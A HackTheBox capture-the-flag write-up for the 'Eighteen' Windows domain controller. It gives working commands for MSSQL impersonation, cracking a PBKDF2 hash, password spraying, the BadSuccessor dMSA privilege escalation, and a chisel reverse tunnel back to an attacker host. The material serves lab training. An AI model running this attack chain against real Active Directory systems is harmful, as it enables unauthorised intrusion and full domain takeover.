---
title: Eighteen - HTB
date: 2026-02-11
categories: [WriteUps, HTB]
tags: [HTB, windows, AD, privesc]
image:
  base: /assets/img/posts/htb/eighteen
active: false
difficulty: easy
os: windows
description: "Eighteen is the 9th machine of HackTheBox Season 9."
pawned: root
---

# Info
Machine Information:
As is common in real life Windows penetration tests, you will start the Eighteen box with credentials: 

> Starting credentials: `kevin / iNa2we6haRj2gaw!`

## Scan

```bash
sudo nmap -n -sS -Pn -p- -oN scan.txt 10.129.6.13
# PORT     STATE SERVICE
# 80/tcp   open  http
# 1433/tcp open  ms-sql-s
# 5985/tcp open  wsman

nmap -n -sV -sC -Pn -p80,1433,5985 10.129.6.13
# 1433/tcp -> Microsoft SQL Server 2022
#             NetBIOS_Computer_Name: DC01
#             DNS_Domain_Name: eighteen.htb
# 5985/tcp -> WinRM
```

We are against a **Domain Controller**.

---

## Foothold

`kevin` cannot authenticate via WinRM, but MSSQL works:

```bash
nxc mssql 10.129.6.13 -u kevin -p 'iNa2we6haRj2gaw!' --local-auth
# [+] DC01\kevin:iNa2we6haRj2gaw!
```

### MSSQL Impersonation → appdev

Connect and enumerate permissions:

```bash
mssqlclient.py 'kevin:iNa2we6haRj2gaw!@10.129.6.13'
```

```sql
SELECT sp.name, spm.permission_name
FROM sys.server_principals sp
LEFT JOIN sys.server_permissions spm ON sp.principal_id = spm.grantee_principal_id
WHERE sp.type IN ('S','U','G') ORDER BY sp.name;
-- kevin has: CONNECT SQL, IMPERSONATE
```

Check who kevin can impersonate:

```sql
SELECT pr.name FROM sys.server_permissions pe
JOIN sys.server_principals pr ON pe.major_id = pr.principal_id
WHERE pe.permission_name = 'IMPERSONATE'
AND pe.grantee_principal_id = SUSER_ID('kevin');
-- appdev
```

Impersonate and access the restricted database:

```sql
EXECUTE AS LOGIN = 'appdev';
USE financial_planner;
SELECT * FROM users;
```

```
id    username  email                password_hash                                   is_admin
1002  admin     admin@eighteen.htb   pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673...   1
```

---

## User

### Crack the PBKDF2 Hash

The hash format is `pbkdf2:sha256:<iterations>$<salt>$<hex_hash>`. Hashcat mode 10900 expects the hash in base64 and the salt in base64, but the Werkzeug format uses raw strings. Use a [custom Python cracker](https://github.com/Housma/pbkdf2-cracker) with one fix: change `binascii.unhexlify(salt)` -> `salt.encode('utf-8')`:

```python
def find_matching_password(dictionary_file, target_hash, salt: str, iterations, dklen):
    salt = salt.encode('utf-8')                     # <- key fix
    target_hash_bytes = binascii.unhexlify(target_hash)
    ...
    hash_value = hashlib.pbkdf2_hmac('sha256', password.encode('utf-8'), salt, iterations, dklen)
```

```bash
python3 pbkdf2_cracker.py \
  --hash 0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133 \
  --salt AMtzteQIG7yAbZIa \
  --iterations 600000 \
  --dklen 32 \
  --wordlist /usr/share/wordlists/rockyou.txt

# [+] Password found after 234 tries: iloveyou1
```

### Password Spray → adam.scott

RID bruteforce via MSSQL reveals domain users. Spray the cracked password via WinRM:

```bash
nxc winrm 10.129.6.13 -u users.txt -p 'iloveyou1' --continue-on-success
# [+] eighteen.htb\adam.scott:iloveyou1 (Pwn3d!)
```

```bash
evil-winrm -i 10.129.6.13 -u adam.scott -p 'iloveyou1'
```

User flag is in `C:\Users\adam.scott\Desktop`.

---

## Root

### Group Enumeration

```powershell
whoami /groups
# EIGHTEEN\IT  -> key group
```

Load PowerView and check what IT can do on the `Staff` OU:

```powershell
. .\pv.ps1
$ITSID = (Get-DomainGroup "IT").objectsid
Get-DomainOU -Identity "Staff" | Get-DomainObjectAcl -ResolveGUIDs |
  Where-Object { $_.SecurityIdentifier -match $ITSID }
# ActiveDirectoryRights: CreateChild
# ObjectDN: OU=Staff,DC=eighteen,DC=htb
```

IT members can create objects in `OU=Staff` - perfect for **BadSuccessor**.

### BadSuccessor — dMSA Privilege Escalation

**Concept:** The [BadSuccessor](https://github.com/akamai/BadSuccessor) attack ([CVE-2025-26647](https://cyberdom.blog/inside-dmsa-on-ad-2025-how-it-works-how-to-monitor-it-why-it-matters/)) abuses Delegated Managed Service Accounts (dMSA). By creating a dMSA that claims to be a successor of a privileged account (Administrator), any principal allowed to retrieve its password will inherit that account's full privileges including its NT hash and Kerberos keys.

**Step 1:** Detect the attack surface:

```powershell
# Verify IT has CreateChild on Staff OU (done above)
```

**Step 2:** Create a computer account in `OU=Staff` as the retriever:

```powershell
New-ADComputer -Name "badDMSA" -Path "OU=Staff,DC=eighteen,DC=htb"
```

**Step 3:** Compute Kerberos keys for the computer:

```powershell
.\rb.exe hash /password:Passw0rd@123456 /user:badDMSA$ /domain:eighteen.htb
# aes256: 6E126ADCB79D71C7E12E0D2A4604EE914B4C4A152553B2FCE0B76B1ACDCAE436
```

**Step 4:** Create the dMSA with `badDMSA$` as the allowed retriever:

```powershell
New-ADServiceAccount -Name BadSuccessDMSA `
  -DNSHostName BadSuccessDMSA.eighteen.htb `
  -CreateDelegatedServiceAccount `
  -KerberosEncryptionType AES256 `
  -PrincipalsAllowedToRetrieveManagedPassword "badDMSA$" `
  -Path "OU=Staff,DC=eighteen,DC=htb"
```

**Step 5:** Grant adam.scott GenericAll on the dMSA to manage it:

```powershell
$adamSID = (Get-ADUser -Identity "adam.scott").SID
$acl = Get-Acl "AD:\CN=BadSuccessDMSA,OU=Staff,DC=eighteen,DC=htb"
$rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $adamSID, "GenericAll", "Allow"
$acl.AddAccessRule($rule)
Set-Acl -Path "AD:\CN=BadSuccessDMSA,OU=Staff,DC=eighteen,DC=htb" -AclObject $acl
```

**Step 6:** Link the dMSA to Administrator (the succession magic):

```powershell
Set-ADServiceAccount -Identity BadSuccessDMSA -Replace @{
  'msDS-ManagedAccountPrecededByLink' = 'CN=Administrator,CN=Users,DC=eighteen,DC=htb'
  'msDS-DelegatedMSAState'            = 2
}
```

**Step 7:** Get a TGT for `badDMSA$` and request the dMSA service ticket:

```powershell
.\rb.exe asktgt /user:badDMSA$ /aes256:6E126ADCB79D71C7E12E0D2A4604EE914B4C4A152553B2FCE0B76B1ACDCAE436 /domain:eighteen.htb /nowrap
# → <TGT_B64>

.\rb.exe asktgs /targetuser:BadSuccessDMSA$ /service:krbtgt/eighteen.htb /dmsa /opsec /ptt /nowrap /ticket:<TGT_B64>
```

**Step 8:** Convert ticket and export:

```bash
# Use RubeusToCcache: https://github.com/SolomonSklash/RubeusToCcache
python3 rubeustoccache.py <TGT_B64> ticket.ccache
export KRB5CCNAME=/path/to/ticket.ccache
```

**Step 9:** Tunnel via chisel and execute as Administrator:

```bash
# Attacker
./chisel server -p 1234 --socks5 --reverse

# Target (PowerShell)
.\chisel.exe client http://<ATTACKER_IP>:1234 R:socks

# Attacker — authenticate with the dMSA ticket
faketime -f "+3h" proxychains4 smbexec.py -no-pass -k DC01.eighteen.htb -dc-ip 10.129.6.13
```

```
C:\Windows\system32> whoami
nt authority\system

C:\Users\Administrator\Desktop> type root.txt
```